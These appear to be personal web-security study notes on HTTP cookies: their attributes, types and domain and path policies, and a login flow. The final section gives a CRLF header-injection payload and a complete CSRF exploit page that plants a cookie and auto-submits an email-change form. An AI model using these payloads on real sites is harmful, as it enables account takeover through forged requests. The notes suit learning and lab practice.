### General Notes

Created to make [[HTTP]] [[Protocol]] stateful.
- They are textual information that is set by the server, and then installed by a website into the Cookie Jar of the **browser**.
- Storing data on the client side instead of the server side ([[Sessions]]).

> Cookie Jar is storage space where web browser stores cookies.

Can be viewed in JavaScript using `document.cookie` through the DOM, or the Document Object Model.

---
### Cookie Format

Servers can set cookie via the `Set-Cookie` [[HTTP]] header in a response message. Cookies are formed of key=value pairs. In addition to the cookie data, there are some other flags and options that need to be set such as:
* **Expiration Date**: The data when the cookie is no longer to be used, or not to be sent by the browser to the server. Done using `expires`.
* **Path**: sends the cookies to all subsequent requests to this path and everything under it.
* **Domain**: the scope of the cookie, or which domains and subdomains it has access to.
* `HTTPOnly` Flag: only HTML technology can read the cookie. Secure against [[Cross Site Scripting (XSS)]].
* `Secure` Flag: Cookies are only sent over [[HTTPS]].

##### Cookie Types

**Non-persistent Cookies**: These are also called [[Sessions]] cookies, and they are temporary cookies that are stored while a website is being used. 
- Once the browser closes, or the browser session is over, these cookies are deleted.
- These offer enhanced privacy as they do not persist or track users beyond the current session.

**Persistent Cookies**: These remain on the browser or device for a specified period of time as defined by the **expiration date** of the cookie.
- They preserve information between browser sessions, and are useful for maintaining user preferences.
- However, they can be used to track users across multiple sessions and monitor behavior.

**Secure Cookies**: These are cookies that can only be transmitted over [[HTTPS]], and are marked by the `secure` flag.
- These help protect session information and user data.

**HTTPOnly Cookies**: These are cookies that *can not* be accessed by JavaScript.
- These are useful for storing session information and guaranteeing security by preventing scripting technology to access its data.

##### Cookie Policy

Cookies are sent to the valid domain and path, and only when they are not expired.
- They also are managed according to the flags that are set.

**Domain Policy**:
- Cookies can be sent to the subdomains of the domain set, but not vice versa.
- Subdomains can set cookies for their direct super-domain, but not vice versa. This does not apply to TLDs.
- If the domain is not set, the `Host-Only` flag is enabled, and the cookie is only sent to the exact host of the request, or the current domain only.

**Path Policy**:
- Cookies can be sent to the path specified, and anything under that path.
- If the path is empty, the cookie is only sent while accessing the path of the requested resource only.

---
### Cookie Protocol

Login Example: 
1. Browser sends a POST request with username and password
2. Server sends a response with a `set-cookie` header to tell the browser to install the cookie
3. For every further request, the browser considers the cookie data and flags
4. If the checks pass, then a cookie will be inserted in the header of the browser request

> What this does, is that the browser now manages to maintain a *stateful* connection to the server, meaning that all subsequent requests don't need authentication again.

---
### Modifying Cookies for [[Cross Site Request Forgery (CSRF)]]

- A technique to check for adding cookies is through header injection.
```
/?search=mins
Set-Cookie: csrfKey=IBuIZ44nmISVeACecCzxOeLyT1YIxL9p;
```

- Adding a new line then adding the `Set-Cookie` header with the cookie. To use it, it must be URL-encoded. [[Web Encoding]].
```
/?search=test%0d%0aSet-Cookie:%20csrfKey=IBuIZ44nmISVeACecCzxOeLyT1YIxL9p%3b
```

- To use it in the HTML payload to set a cookie, replace the `script` tags with:
```HTML
<img src="https://URL/?search=test%0d%0aSet-Cookie:%20csrfKey=IBuIZ44nmISVeACecCzxOeLyT1YIxL9p%3b%20SameSite=None" onerror="document.forms[0].submit()">
```

- This loads the page that sets the cookie, then since it isn't an image, the `onerror` attribute is fired submitting the form.
``` HTML
<html> 
	<body> 
		<form action="https://URL/path" method="POST"> 
			<input type="hidden" name="email" value="newmins@mins.com" /> 
			<input type="hidden" name="csrf" value="<csrf-token>" />
		</form> 
		<img src="https://URL/?search=test%0d%0aSet-Cookie:%20csrfKey=IBuIZ44nmISVeACecCzxOeLyT1YIxL9p%3b%20SameSite=None" onerror="document.forms[0].submit()">
	</body> 
</html>
```

---
